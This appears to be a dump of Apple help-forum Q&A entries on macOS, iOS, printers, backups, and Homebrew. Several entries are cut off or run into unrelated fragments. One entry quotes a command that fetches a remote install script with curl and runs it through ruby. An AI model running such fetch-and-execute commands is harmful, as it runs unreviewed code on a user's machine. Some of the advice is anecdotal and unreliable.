reinstalled, it removes the files in /System and simply replaces them with the new system. A reformat is not at all required and won't make a lick of difference to the stability of the operating system as the OS doesn't merely install overtop the old one. If you do wish to start fresh, however, boot into Internet Recovery (CMD + R), go to Disk Utility and simply repartition your hard drive and then reinstall OS X. Once done, use Migration Assistant to restore your user account and your respective data and installed applications.\n", "Q: Software is corrupt that worked only months ago? I have been trying to use the Java Decompiler, JD-GUI, on my 2007 iMac running OS X 10.9.5 for the past week, but I have been running into a road block.\n\nOnly a few weeks ago, I did not have this problem. What I've normally done is have the disk image in my Downloads directory, and I open the disk image and used the application from the image directly. However, one day, I received that error for the first time, so I went and redownloaded it from the provider of the software, but kept running into the same issue.\nI have tried this from multiple Internet connections to no avail.\nAlso worth noting I think is that when I drag the application from the disk image, its file size is only 2KB, which is a problem. Upon opening the application then, it says the application is corrupt and it moves it to the trash.\nIs there any fix or workaround for using this software? I'm trying to understand why it was working only a few short months ago.\nJD-GUI can be found here: http://jd.benow.ca/\nEdit: Worth noting is that the checksum values match for both the downloaded copy and the one listed on the download page! Perhaps an issue with 32-bit vs 64-bit libraries?\n\nA: Apple's OSX Mavericks 10.9.5 update changed some app signing rules.

Have you signed up for an account and linked OneNote to that account? \nhttps://onedrive.live.com/about/en-us/\nI am thinking that is the most likely cause of that error.\n\nA: I was getting the exact same error message when I just set up OneNote through my University, and it kept asking me to sign in repeatedly.\nTurns out, at least for me, the OneDrive cloud service that it was using wasn't actually set up yet even though I'd registered. I had to go to the OneNote website online to get to the OneDrive for Business and sign in there to get the drive set up. Once I did that I didn't have any problems!\n\nA: I went through this as well with the same message. It would only show the OneDrive as my uni's. What you need to do is download the app OneDrive and then sign up. Works a treat now!\n\nA: It may help if you log in to OneNote via your browser, create the new notebook, then click the tab (top right of browser page) to \"open in OneNote, then it will open the app and force the app to open the new notebook. It's a Microsoft problem with syncing, where even if you're signed in to OneDrive, it won't let you create a new Notebook...alternatively, there is always Evernote!\n\nA: For the people having problems with say the uni accounts.\nI kept having this issue and couldn't get around it for ages. In the end what I decided to do is set up a microsoft account using my zmail (or whatever email you're using), go to onedrive and set it up for that email. Then connect the service in one note and it should allow you to create a workbook for that onedrive.\n\nA: Found a solution: Start by signing out and singing back in with your school/work email. Seems to be a problem with school and work accounts. \n\nA: At the time of the occurrence of the error, all the recommendations given in the above answers were already tried with no luck. This was due to a Microsoft bug which has been addressed a while ago. \nThanks to all of the contributors, anyway.\n\nA: Had the exact same problem, mine is not a university account, but a personal 365.\nOne of the solutions above helped. I logged into one note from browser and then changed the note save location - it prompted me to login again and the problem was gone.\n\nA: For me it was the online privacy preference setting in the office suite. I had everything toggled off and that must have prevented the sync with MS one drive. Once activated and then one note closed and restarted - all worked.\n\nA: Sign out of your OneNote account then log back in. That should fix the issue.\n", "Q: Can only one partition of old hard drive been transferred to new MacBook? I just took the hard drive out of my MacBook pro that broke down a few days ago and put it into an enclosure. My questions; If I buy a new MacBook pro, is it possible to ONLY transfer the  Macintosh HD partition  from the enclosure onto the new MacBook pro, WITHOUT transferring the Bootcamp partition  as well?\nThanks for your help!\n\nA: I have not look at this related to Bootcamp in a few years, but I my searches indicate this has not changed. \nApple's Migration Assistant will only look for attached Mac OS X system volumes to migrate. It will not migrate Bootcamp partitions or other data on non-boot volumes. \n", "Q: Does Time Machine use internet? I'm not very computer savvy. I recently got my MacBook back after getting a new hard drive. I've now just starting using Time Machine to back up everything. I live in rural Texas and I only have 10 GB of satellite internet data to use each month and I've used it all in 2 days while barely using the internet. \nDoes Time Machine use data? If not, any ideas on what could be eating all of my data up? My Wi-Fi is secure, even if it wasn't there is no one around to use it anyway.\n\nA: Time Machine does not use the internet, but iCloud does. If you use an iPhone or iPad, iCloud will backup the images to iPhoto, and that can use significant bandwidth. \nCalendar, Mail, Contacts, Messages, Notifications, Twitter, etc all use bandwidth, and all are on by default. iCloud will also backup your documents and data, if you have configured this. If you have more than 10GB of files in your Documents folder, iCloud could be simply backing them up from the new hard drive.\n\nA: I feel your pain. I spent the past few years on satellite and it was very unpleasant.\nYour best bet for monitoring and controling your Internet usage is buy LittleSnitch. It will monitor your Mac and tell you every time that it is trying to make a connection, allowing you to allow or deny the request.\nFor some apps (such as email, web browser, etc), you may want to allow access anytime it wants it so you don’t have to approve each time.\nThe first few days of using LittleSnitch will be frustrating, as you start to set rules and tell it what to do, but after you get past that, it will be a big help in keeping your usage in check.\nUnfortunately OS X is not very good about telling you everything that it is doing, and it assumes that any available Wi-Fi connection can be used without limits. Until recently iOS was much better about this, but it now allows much more background activity, so if you have an iPad and/or iPhone/iPod touch you need to watch out for those as well.\nWhen you are not using MacBook, I recommend closing the lid so that it will sleep.\n", "Q: Can't print in fast / draft when connected to printer over wifi, but can when connected via usb Summary: The fast/draft printing option is not available when connected over WiFi, but works with USB. (Editor Note: seems to effect many printers from both Canon an other manufacturers)\nSpecifically: \nI recently bought a Canon ix6850 printer to replace my Canon ix6500 (really the 6850 is just an updated version with built-in wifi). Now I've got this new 6850, if I connect to it over wifi I get the following the print setting. Note: draft is not an option. \n\nBut if I move my laptop next to the printer and connect via the usb cable I get the following. Any idea how I can enable draft when connecting over wifi?\n\n\nA: Update and step-by-step directions:\nOn the latest versions of OSX (e.g. tested with High Sierra, 10.13.2) there is a seemingly handy option to add \"nearby printer\" which lists printers the OS can auto-locate. The problem is that this option defaults to using airprint and never gives the option to change the print driver with the \"use\" drop down.\nTo fix this (see also this Epson-focussed exchange on Apple Communities), reinstall the printer using the printer-specific driver:\n\n*\n\n*Open Printers & Scanners in System Preferences.\n\n*Select the Printer with the troublesome airprint driver\n\n*Press the minus sign, \"-,\" at the bottom to remove the current printer\n\n*Press the plus sign, \"+,\" to add a new printer\n\n*Don't select from the nearby list, but rather select \"Other\"\n\n*The printer should still appear on the list in the resulting dialog. Select it, but before pressing add, access the \"Use\" drop down to select the corresponding printer driver. If your printer type is not listed below AirPrint, see if it is listed under \"Select Software...\" If it is still not there, you might need to download an updated driver from your printer manufacturers website.\n\n*Once you have the corresponding driver selected in \"Use\" press the \"Add\" button.\n\nThis should now use the manufacturer customized printer dialog including the option to select \"Fast\" for \"Print Quality\" under the \"Quality and Media\" option set.\n\nA: I've seen different features when someone is using the airprint driver (which automatically gets assigned to the printer when WiFied) compared to the 'normal' driver via USB. It says if it's airprint or not in system prefs>print&scan \"Kind\"\n\nYou can choose what driver you want when you add the printer in the \"use:\" drop down. Try a couple. If as you say, the 6500 is the same but sans wifi then try the 6500 driver. \nI mean these are just first steps. I haven't even gotten into gutenprint or messing with ppd's to add features/paper sizes to drivers that don't officially support them. CUPS is some cool tech.\n\nA: Judging from the swapping of the words \"Media & Quality\" to \"Quality & Media\" in each screenshot, I'd say that when you use the printer with USB, your computer selects a different \"draft-able\" driver. When the printer is accessed over Wi-Fi, another driver is used, which prohibits Draft mode printing for some reason.\n", "Q: \"git commit -a\" causes \"subl -w: subl: command not found\" i am not sure what is causing this problem but i am having problems using git.

There will be a [core] section which sets the editor\ne.g. for Sublime Text\n[core]\n  ...\n  editor = subl -w   \n  ...\n\nremove the editor line to make the default editor go back to the shell's default editor\n", "Q: How to move this window?

That would both help you decide to press charges and certainly alert Apple to the situation in an official and formal manner.\nOf course, you should change your AppleID password immediately to some password you don't use on any other online site.

I usually see the well known rainbow colored spinning wheel when the Mac is working on something, but sometimes there is a blue one. What is the difference between them? Do they come from the OS and have a special meaning or is it application dependent?\n\nA: *\n\n*  The rainbow spinning pinwheel is usually controlled by the OS.\n\n*  The blue pinwheel is shown by an app to indicate loading.\n\n\n\nThe spinning wait cursor (shown below) is also standard, but it is displayed automatically by the window server when an app can't handle all of the events it receives. In general, if an app does not respond for about 2 to 4 seconds, the spinning wait cursor appears. If the app continues to be unresponsive, users often react by force-quitting it.\n\nSource: OS X Human Interface Guidelines: Use the Right Pointer for the Job\nThe blue pinwheel is sometimes called the JavaScript pinwheel as JavaScript in websites are one of the primary ways a user will see this cursor, for cross-platform reasons, as in OS X a 'waiting' cursor is generally not recommended.\n", "Q: Bridge non-adjacent monitors in three monitor setup I would like to use the following 3 monitor setup because the arrangement aligns logically with the physical placement of the monitors.\n\nIs it possible to bridge the gap between the left and right monitors, above the primary?\nOR\nIs it possible to detect and move the mouse via scripting?\n\nA: Just thinking outside the box a minute…\n…wouldn't this achieve something close to what you want, without the need for any external solution.\nIt would give you a clean 'jump' between the external screens, balanced against a slight loss of accuracy in the transition between the top left & your main screen.\n\n", "Q: How can I set duplex to be the default option when printing in Acrobat Pro XI? I wish for duplex to be the default, but I must reset it each time the application is launched.  I would expect to find the option in the Print... dialog of Acrobat, however I do not find it in the dialog or its subdialogs including and I find no Print Setup... dialog.  I looked in Advanced but only find Output, Marks and Bleeds, PostScript Options, and Color Management as available and most of those include greyed out options, none being whether to print in duplex. This is for a Brother MFC-8910DW printer via USB. (Acrobat crashes when using wireless connection, this is supposedly fixed in Yosemite.) The Page Setup... and Printer... subdialogs give a warning message when you bring them up:\n\nThe {Page|Print} Setup dialog box is provided by the operating system. To ensure that you can use the full print capabilities of Acrobat, please set all print options from the Application print dialog box. Do you want to continue?\n\nInside the Print Setup is the only location where I can choose duplex printing which is always off by default after launching the application.  It wouldn't be such a hassle if I could just leave acrobat running all the time, but it crashes about once a day, very buggy since version Acrobat Pro X after going to Mavericks.\n\nA: The easiest way to do this is to just set a preset for your printer.\nOnce you have the setting the way you want, just go to Presets, and save it, call it Duplex, and then you are set..\n\n\nA: I haven't managed to find a permanent solution for this. Saving a preset doesn't always help. It works in Acrobat Reader but not Acrobat Pro which requires you to select Properties...Advanced...DuplexMode and set it to duplex every time you open a different document. The default seems to be single-sided regardless of your printer settings. I have encountered this at work and at home and on different systems and printers. It must be reset for each new document that is opened. \n", "Q: How do I make my BeaconOSX iBeacon signal detection more accurate? Here's my setup:\niMac with BeaconOSX\niPhone with Proximitask\nI am successfully broadcasting a signal and am getting notifications as I come and go to my office.  However, the reminders are getting triggered well outside of the building and sometimes rapidly & repeatedly triggering when I'm 5 rooms away just sitting in the conference room.\nBeaconOSX has 3 values I can adjust (other than the UUID):\n\n\n*\n\n*major (5)\n\n*minor (5000)\n\n*measured pwr (currently set at -10)\n\n\nThe initial value of measured pwr was -59, and that's when it was triggering things on my phone from outside the building.  Increasing that value to -10 seems to have helped somewhat.  Today's reminders went off just outside my section of the building, but I'd like it to me as accurate as when I step inside my office.\nI've read that beacons need to be calibrated, but with just BeaconOSX and Proximitask, I don't think I know how to do that.  I also read that increasing measured pwr increases the signal strength, making distance estimation more accurate.  Is reducing that value also a valid way of preventing the triggerings from happening outside my office?  Is there software I can use for calibration?\n\nA: We launched an iBeacon, nfc, proximity App called HelloLocal (http://www.hellolocal.me) that we're implementing into shopping centers, cities and various other locations.\nOne of the biggest challenges for us when implementing dense arrangements of beacons has been the balancing of signal strength, especially when we have multiple beacons within and area.\nThere are a few things I would suggest doing:\n\n\n*\n\n*Look at using an App that helps calibrate your beacon. Our tech team have one that they have used but I can't recall the name. Let me know if you are interested in this and I'll chase it up. We have our own CMS sitting off the back of our App that we're now able to control / tweak the signal strength within the CMS so we're not using a calibrator anymore. This makes things much easier :)\n\n*Use your major and minor settings. This isn't ideal as one of the great features of beacons is being able to do different things (i.e. load different content) at the various settings. I'd personally prefer not to be set to one.\n\n*Wrap the beacon in silver foil (aluminium foil for baking etc). This can soften the beacon signal strength.\nHope this info helps!\nBrent\n", "Q: Can my web app use a UNIX socket on OS X Server?

Upon launching Boot Camp Assistant I encountered a strange problem, the only destination disk I could select was my 32 GB USB stick which I have plugged in.\nWhy is my new partition not visible to the Boot Camp Assistant software?\n\nA: Best way to do this, delete the FAT partition and re-expand your HFS+ partition to fill up the space.\nUse bootcamp assistant to create a bootable USB key (you'll need an 8GB one). It will ask for the ISO to make the installer.\nOnce it is done boot from the USB key and follow the prompts. Bootcamp will partition your drive for you at the beginning of the setup process and set it up properly to dual boot.\nMy guess is that something in the way you made the partition (location, type, etc.) was incorrect.

There you have the receipient's Apple ID with the app bought. \nNow the donor can log back in using own Apple ID in iTunes store and redownload the app.\nThen the receipient can use his/her own Apple ID in iPhone 4 to download the app.\nBoth parties got what they want on their respective Apple ID and iPhones.\n\nA: I just encountered this issue setting up my son's iPhone 4.\nThe important bit is to have an iTunes account that you've used to download an app in the past (in my case, my account, since I've had my account since the iPhone 3G days.)\nOn the iPhone 4, go to Settings > iTunes and App Store > tap Apple ID > Sign Out\nThen Sign in with the other account (ie my account I've had for years).\nThen go to the App Store and when you try to download an app, it will give you the \"Download previous version\" prompt. So go ahead and download it.\nAnd don't forget to sign out and sign back in with the newer account (ie my son's).\n", "Q: Calendar event showing new time change notification every day I have a recurring meeting each day on my Exchange calendar at 8:45 AM. In the Calendar application, I get a notification every morning that the event time was updated to 8:45AM. However, the event organizer is not changing the time, and it stays exactly the same.\nThe only thing I can think of is something odd with time zones and/or Exchange. The organizer is in CST and I'm in Mountain. Calendar correctly shows my time in the event details both before and after getting the alert about the change... \nAny idea what is happening and how to stop the daily notification that the time has changed (since it hasn't!).\nExample of the notification:\n\n\nA: Finally, a solution.\nUnfortunately the meeting organizer will have cancel and recreate the event to solve this problem. The problem is a result of the meeting organizer including themselves as an attendee which creates a sort of loop for meeting updates.\nTo solve, the organizer must create a new event that does not include themselves as an attendee. If the a distribution list is used, they must expand it and remove their name from the list. \nAnswer source.\n", "Q: Iphone as audio driver My macbook pro speakers are totally busted and I think that the soundcard is broken as well because I cannot play music even through headphone jack.

For the past few days, my phone has been shutting off when the battery reaches around 20%. It will not turn back on until I plug it into a power source. When I plug it in, it automatically powers itself on, and the battery shows about 20%.\nThis is my battery info:\n\n\n*\n\n*CycleCount: 298\n\n*DesignCapacity: 1430\n\n*FullChargeCapacity: 1000\n\n*Status: Success\n\n*BatteryCurrentCapacity: 72\n\n*BatteryIsCharging: true\n\n*ExternalChargeCapable: false\n\n*ExternalConnected: true\n\n*FullyCharged: false\n\n*GasGaugeCapability: true\n\n\nQuestions: does anyone knows why this is happening, and how can I make the battery function until 2-4% like it used to before?\n\nA: I attempted someone else's suggestion to let the battery naturally die off (let something running without actively using it), then charge it back until 100% without unplugging. The first time it did not work, but after I did that for the second time, my phone is back to normal. So... I just needed to be patient I guess.\n\nA: Two likely solutions:\n1) Change the battery.\n2) Backup & restore.\nIt is unlikely to be a software problem, considering the circumstances; so there's probably not much you can do without a screwdriver. Just in case, try 2) first and if that doesn't work, take it to an Apple store, and get it looked at by an Apple genius. They will either offer a new phone, or change the battery. Both will cost unless you have a warranty.\nGood luck! \n\nA: I keep fully charging my iPhone 4s and using it throughout the day. Every couple of days my phone is dying at 7% 20% etc. I have researched this and many people are experiencing the exact same thing. The same percentages and are fully charging it! I think it is just a problem with iPhone 4s'due to reasearch.\nMy phone was second hand and off eBay and someone I know had the same problem with theirs. It is definitely a big problem with iPhone 4's and 4s'.\nThanks.\n", "Q: Mozilla Firefox and Thunderbird as default browser and mail client I use Firefox and Thunderbird for browsing and email.

Anyone have any suggestions?\n\nA: I resolved this problem. If anyone else runs into it in the future just go to chrome settings and then go to advanced settings and reset settings. It just brought me to default. Something in my settings was causing it. Honestly have no idea what it was.\n\nA: The message \"WebRTC has active PeerConnections\"\ncould be a product of your Chrome settings.\nPaste this \"chrome://flags/\" in your Chrome web address bar.\nFind and disable the WebRTC.\n\nA: I had the same problem with some older versions of Chrome. They had a setting like \"Allow background processes to run even when Chrome is closed\". Every time Chrome updated to a new version I had to go to settings and uncheck this option, otherwise my MBP won't get to sleep by himself.\nBut this settings is not there any more since some versions of Chrome and have not noticed this behavior any more.\n\nA: I had similar problem on Win10 and my findings may be pertinent.  I battled the problem where webRTC PeerConnections were preventing auto-sleep. In my experimentation, simply closing the tab that created the webRTC connections wasn't sufficient; I had to actually shut down chrome completely, i.e. exit all tabs. Then I found a more preferable work-around: instead of closing the tab that has webRTC connections, navigate that tab to a different web page or site which doesn't use webRTC. That will close out the webRTC connections and it isn't necessary to completely exit chrome. \nNote that this assumes that you've figured out which web site/page is causing the webRTC connections to be created. To do this, run \"powercfg -requests\" before and after opening tabs until you discover the culprit. For me it was the search results page on slickdeals.net website.\n", "Q: Does right clicking always select the text below the cursor on a mac?

Don't waste your time in the general settings change it from the program.\n\nA: When I had this problem, I went into year view, and there I was able to add an event. I changed beginning date to the right one and after creating this initial event, I was able to add new ones. \n\nA: On iPhone 5, my wife's phone was showing no events. Went to Calendar, (bottom center) at top of next page page I found that the show all calendars was turned off. I changed it and all her events showed up. \n\nA: Make sure you have a Calendar set up in iOS, either an iCloud calendar (Settings -> iCloud) or another one (Settings -> Mail, Contacts, Calendars). If your only calendars are read-only, like Facebook Events and Birthdays, you won't be able to create events.\nIn iOS 7 and 8, you can check the calendars that have been set up by tapping \"Calendars\" at the bottom of the calendar view. If you don't see an iCloud calendar or another one you can edit, you'll need to create one.\n", "Q: Burst images will not upload when sharing to iCloud via iPhoto I took burst photos with my iPhone 6.

While I'm at home, I backup the machine to a Western Digital MyBookLive network drive, using Time Machine. This arrangement worked just fine for the longest time. But about last year (sometime in Mountain Lion), I started having this issue where every time I'd come home and connect to my local WiFi, TimeMachine would kick in but soon gives me this message:\n\nThe backup disk image “/Volumes/TimeMachine/MyMBPro.sparsebundle” is\n  already in use\n\nI've looked far and wide for a proper solution to how to resolve this issue, but not found one.\nThe temporary solution (recommended by various websites) is always to restart the MyBookLive, either by disconnecting it's power or using it's website to restart, both of which are annoying and time-consuming options, especially on a daily basis. The Pondi website seems to suggest some network drive has been left connected, but that's not the case either. \nThere has to be a better way. Should I be disconnecting my machine before leaving the house to prevent this message when I reconnect? I've tried sleeping the computer before leaving, but that doesn't help. Neither does trying to \"Skip this backup\", which takes forever to finish up. \nIf someone has a good work-around or a suggestion I could try out, I'd really appreciate it.  \n\nA: Do you have access to you Western Digital MyBookLive via ssh ?\nCan you change some config files from it?\nI believe Western Digital MyBookLive use netatalk for allow connect to it via afp protocol from mac os x.\nIf it is true, when you abnormally disconnect from you MyBookLive netatalk wait by default 24 hours before dropping you connection see disconnect time parameter.\nIf you have access via ssh to you MyBookLive you can add \"disconnect time = 1\" parameter (one hour before dropping you connection) to the afp.conf file\nAnd you can set \"sleep time = 1\" (Keep sleeping AFP sessions for number hours before disconnecting clients in sleep mode. Default is 10 hours.)\nIf you don't have access via ssh. I don't now. Maybe need check new firmware for you device, contact WD technical support on this issue.\n\nA: I tried to remedy this problem from everything this and other sites said to do.  It wasn't until the suggestion to go on the Western Digital MyBookLive to change parameters that I found it needed to be updated.  I updated the firmware and the backups started automatically while I took a nap!\n\nA: File in use Error is supposed to prevent a scenario where two apps compete to make changes to the same target, thus resulting in a corrupt file. Most files don't need to be locked, so you can piratically edit a .txt file both TextEdit and TextMate simultaneously. When Time Machine accesses a backup file (.sparebundle), it places a Hold on the file, so a user wouldn't, say use Finder to rename the .sparebundle at that moment.\nThe Hold should be removed as soon as TM finishes backing up. So:\nlsof | grep -i MyMBPro\n\nRun this command in THREE cases:\n\n\n*\n\n*When WiFi at home is normal, i,e. just finished up a backup.\n\n*When the error message is present.\n\n*When TM is doing the backup.\n\n\nThis will show if ANY process on your OS X is accessing the file.\nFor example, when I use TextMate to edit a file called notes.txt\nlsof | grep -i notes.txt\n\nI get:\nTextMate  6539  username   37r     REG                1,7          4  804793 /Users/username/Documents/notes.txt\n\nIf the result is empty in case 1 and 2 but not 3, it means you OS is running correctly.

Ok, I have a late 2011 macbook pro that I'm looking to upgrade. It's sluggish with basic tasks such as right clicking to open the little options menu thingy (like the copy and past menu) and minimizing windows and stuff. I mostly just use my macbook for lots and lots of Internet browsing... And I mean lots (I currently have 20 tabs open on 3 different windows of Google chrome) and I also watch quite a bit of netflix and youtube (but when I'm not watching those I don't have it open in a tab so that shouldn't be that big of a problem). So should I upgrade my RAM from 4 GB to 8 GB or should I upgrade my 500 GB HDD to a 512 GB SSD? Thanks for looking!\n\nA: Given your budget (512GB SSD is quite expensive) I'd buy 8GB RAM + 256SSD and keep the 500GB HDD as a storage volume instead of the super drive. Depending on your country, it'll cost you around 200$ which is less expensive than a 500SSD and will bring you a lot of speed.\n", "Q: Tmux hampers osascripts display notification I like to show notifications from scripts using osascript -e 'display notification \"Some text\"'.\nThis works fine from the plain shell but it stop working when in tmux.\nIt just doesn't show the notification in tmux.

I have a MBA mid 2013. I was wondering if a MBA is plugged in charge, does it bypass battery after it's fully charged?\nBecause while I am working it's always plugged, I wonder how this will affect the actual battery life.\nWhen I was using my laptop, I used to unplug its battery when I was working with AC power in office to preserve its life cycle.\nIs there a way to \"bypass battery and make MBA mid 2013 to only use AC power from wall\"? Or does it do it automatically?\nThere's this similar question, but it's rather old. Also I'm not sure if anything changed both on hardware and software side since 2010.\nThanks in advance,\n\nA: I am not sure how we can know this for sure, but I believe that after fully-charged, it is indeed \"bypassed\". \nOf course after if drops power it could be charging it back up a little bit, but I have never seen that happen.\nAt least not if judging from the LED indicator on the cable, which remains green at all times\n", "Q: Is it possible to downgrade an iPhone from iOS 8 to iOS 7? iOS 8 in my iPhone 5 drains the battery, I'd like to return to iOS 7 if I can.\nIs it possible?\n\nA: Nope. \nApple has stopped 'signing' for iOS 7.\nUnless some new 'method' is found, the change is irreversible.\n", "Q: Re download app with redeemed code I have a set of redeem codes associated to a VPP purchase.\nI went ot my phone itunes and entered the first code.\nThe app download started automatically.\nUnfortunately, due to a network problem, the download failed.\nNow returning to itunes I cannot find any way to re try downloading the app.\nAlso re-entering the code obviously does not work (the code has already been used).\nSo how can I re-try downloading the app on that phone without using a different code?\n\nA: Go to \nApp Store > Updates > Purchased > Not on this Phone. Anything you 'bought' but didn't download or later discarded should be there, with a cloud symbol & down arrow.\n\nA: You can contact Apple's VPP support team and explain the issue.  They should be able to trace the previous code and provide a new one. \nThe contact form is available here: https://www.apple.com/support/itunes/vpp/ (and they'll generally respond within 24 hours in my experience).\n\nA: In the end I figured out what the issue is. The problem is that the App I was trying to redeem on iPhone was designed for iPad only.\nBut this show a couple of issues on the App Store (IMHO bugs):\n1) These is not check and no diagnostic at all. App Store just downloads the App and then gives a generic error message saying \"there was an error.... try again later\" that is totally misleading.

I am running Mavericks\nIt started with me trying to install express.js. Homebrew had been installed on my mac for quite some time, never had any trouble with it. I used sudo npm install -g express, but when I ran express --version, I got command not found. Eventually, I found a possible solution online, and just tried to reinstall npm with brew remove npm and brew install npm. Again, I ran into errors (Unfortunately, I didn't save the exact errors) I used brew doctor to try and figure it out, looked up a ton of tutorials and mucked around with homebrew, and I guess I broke something.\nNow, I figure I should just try and reinstall homebrew. \nI run the install command for homebrew:\nruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"\nIt returns this message:\nIt appears Homebrew is already installed.

And why is the brew installer referring to a repository I used as a test for a little web project? (right above Installation succesful!)\n\nA: Short term answer, try this command to see if your brew installation worked:\n/usr/local/bin/brew doctor\n\nIt seems that your bash environment may not be looking in the /usr/local/bin for executibles (which means you have to write the full path rather than just the name of the command). The solution may be just resourcing your conf files, which can be roughly done by closing your terminal and opening a new one. Otherwise, you'll want to add a line to your ~/.bash_profile. I think resourcing will do the trick though.\nSo after confirming the success with the first doctor, try quitting your terminal application and starting fresh, then your original usage of brew should work.

This is my first MAC. As on Windows, I want to create a separate partition for my Data. The Default partition shows around 30 GB used space. Why is it so? I suppose Mavericks takes up around 10 GB only.\n\n\nSecondly, what is the recommended size for Startup disk. I will only use it for development purpose - XCode, XAMP, Qt etc.\n\nA: Ok you've got iLife for free, and installed which means you have:\nPages, Numbers, Keynote, iPhoto, GarageBand.\nI suspect that this adds upto just under 5GB.\nDelete them from the application folder if you don't need them.\nThis is the link to grandperspective, it's free and really great.\nAnd as I said in the comments Xcode is big 3-5GB, the iOS Simulators are big.\nIf you are going to develop in the start-up partition, I would get your development environment set up now and then afterwards add the 2nd data partition in.  \nOh and I forgot the sleep image - if you have 4GB RAM then you'll have a sleep image that mirrors the memory.  If your Mac battery dies when you power it up it recovers the exact state it was in when it shut down. It's the same when it sleeps.  If you have 8GB then you'll have even less drive space. \nSomething to bear in mind when creating bootable partition.\nThis can be turned off, but not a great idea\n\nA: If you want to find out what takes up space, I recommend using third party apps, either \"Disk Inventory X\" or \"WhatSize\".  Disk Inventory X is free, but quite old.  Alternatively you could just \"Get Info\" (command-i) on all your folders and add them up yourself.  \nAs far as free space you'll need on your boot volume, assuming you won't be adding more applications to this volume, leave the same amount of space free as you have physical RAM installed in the machine.

Besides catching an upload in progress I don't see a way to tell what has been uploaded or is waiting. Is there anything I am missing? \nDropbox had a nifty menu bar icon that would display progress and pending files.  \n\nA: Yosemite\nYou can watch individual files in Finder, but there's no GUI for the progress of iCloud changes.\nEl Capitan\nIn El Capitan and later a progress bar can be accessed by clicking on the wheel in the Finder sidebar.\n\n\n\nhttps://georgegarside.com/blog/macos/all-the-little-things-osx-el-capitan-hidden-features/#icloud-drive-upload-progress-indicator (my blog)\n", "Q: Compiling CUPS 2.0 on 10.9: what archflags to use? I installed CUPS 2.0.0 (cups.org) but evidently I needed to include specific architecture flags. Now several things are broken on my mac (e.g. Word won't boot). Error messages reveal that the problem is with libcups.2.dylib (\"built with the wrong architecture\"). \nPer advice I found for an earlier version of OSX, I tried re-configuring CUPS using:\nconfigure  --with-archflags=\"-arch i386 -arch x86_64\" --with-ldarchflags=\"-arch x86_64\" \nbut that did not fix the problem. What is the correct archflag for building CUPS on 10.9?\nNot sure if this is related, but now I can't get the Finder to show invisible files, which is preventing me from reverting to my pre-CUPS 2.0 configuration using Time Machine. \n\nA: I do not have 10.9 and CUPS 2.0, but I had a very similar experience with 10.8.5 and trying to get CUPS 1.7.2 up and running.  The default configure and make ONLY builds a 64-bit set of libraries.  I had success with using the same architecture flags for both the effective CFLAGS and LDFLAGS parameters:\n./configure --with-archflags='-arch i386 -arch x86_64' --with-ldarchflags='-arch i386 -arch x86_64'\nmake clean\nmake\nBefore getting this straightened out, many programs (from Spotlight to Safari to Outlook) did not work with 64-bit only libcups*.dylib libraries.\n", "Q: how can I use my macbook pro as a primary display for my mac mini?

I don't mean simply to remove duplicates - that's been answered; I'm not asking how to set the default program - I know how to do that. I'm using OS X Mavericks.\nExample: I have .jpg set to default to open with Xee, but sometimes want to open it with an image editor, so I right-click in finder. I noticed I then get a very long list including lots of apps that cannot open .jpg files at all. (Some are Fluid Apps which may trigger because they're browser based.)\n\nA: I will suggest an alternative way than modifying the system's \"open with\" list.\nI use LaunchBar as my main tool to interact with apps, files and more. I have configured LaunchBar so that when I select a document (or some text) and double tap the command key, LauchBar will allow me to specify the Application to open the file.\nI believe that Alfred and Quicksilver have similar abilities. \n\nA: You can fix this on a per-app basis.

I have a mid 2010 27\" iMac. Until this evening it had an SSD (primary drive with OS X Mavericks installation on it) and a HDD as second drive. The HDD is a Western Digital I built into the iMac in 2012 after the Seagate HDD, which came preinstalled, was about to die.\nI want to use the HDD in a external drive case. It is the recent Western Digital My Book Studio. For testing I attached the drive controller via my USB 3 cable from Leap Motion with my iMac and was surprised that OS X tells me, the media could not be read. S.M.A.R.T. state is completely OK.\nI bought the drive case from ebay (without any drive) and tested the S-ATA controller to work correctly by formatting another HDD I had here with ExFAT and copying some films on it. A Asus Notebook with Windows 8.1  had no problems reading the drive. So I assume it is not the controller which is causing trouble. Or might the controller be configured to encrypt and decrypt and so cannot read the already unencrypted stuff?\nCurrently I am running Disk Drill scanning in depth for files to recover. It had different partitions (but I do not recall the partition table type):\n\n\n*\n\n*HFS+ for Time Machine backups\n\n*HFS+ for ordinary file storage when using OS \n\n*NTFS for file storage (games) for Windows (which was installed through bootcamp on second partition on the SSD)\n\n\nCurrently I am running Disk Drill scanning in depth for files to recover. Disk Drill shows the drive is not formatted (but it is).\nYes, I know, I should have made backups, but one reason I was like \"YOLO!\" was that I took such precautions for the really important stuff which is stored somewhere else and another that I did not have any capacity left for that.\nThat is what is written in system.log when I connect the external drive to the Mac:\nOct 15 20:53:38 peter-imac kernel[0]: USBMSC Identifier (non-unique): 574341545241343535313739 0x1058 0x1144 0x1019, 2\nOct 15 20:53:38 peter-imac kernel[0]: IOSATDriver[0xffffff80369a1c00]::IdentifyDevice JMicron probe failed, trying with PassThrough16\nOct 15 20:53:46 peter-imac kernel[0]: IOSATDriver::Send_ATA_IDENTIFY failed 2 2\nOct 15 20:53:46 peter-imac kernel[0]: senseData: VALID_RESPONSE_CODE=112 (7=valid),\nOct 15 20:53:46 peter-imac kernel[0]: :          SEGMENT_NUMBER=0,\nOct 15 20:53:46 peter-imac kernel[0]: :          SENSE_KEY=2 (7 = FILEMARK, 6 = EOM, 5 = ILI, 3-0 = SENSE KEY)\nOct 15 20:53:46 peter-imac kernel[0]: :          INFORMATION_1,_2,_3,_4=0,0,0,0,\nOct 15 20:53:46 peter-imac kernel[0]: :          ADDITIONAL_SENSE_LENGTH=10,\nOct 15 20:53:46 peter-imac kernel[0]: :          COMMAND_SPECIFIC_INFORMATION_1,_2,_3,_4=0,0,0,0,\nOct 15 20:53:46 peter-imac kernel[0]: :          ADDITIONAL_SENSE_CODE=4,\nOct 15 20:53:46 peter-imac kernel[0]: :          ADDITIONAL_SENSE_CODE_QUALIFIER=1,\nOct 15 20:53:46 peter-imac kernel[0]: :          FIELD_REPLACEABLE_UNIT_CODE=0,\nOct 15 20:53:46 peter-imac kernel[0]: :          SKSV_SENSE_KEY_SPECIFIC_MSB=0 (7 = Sense Key Specific Valid bit, 6-0 Sense Key Specific MSB),\nOct 15 20:53:46 peter-imac kernel[0]: :          SENSE_KEY_SPECIFIC_MID=0,\nOct 15 20:53:46 peter-imac kernel[0]: :          SENSE_KEY_SPECIFIC_LSB=0\nOct 15 20:53:46 peter-imac kernel[0]: IOSATDriver[0xffffff80369a1c00]::IdentifyDevice 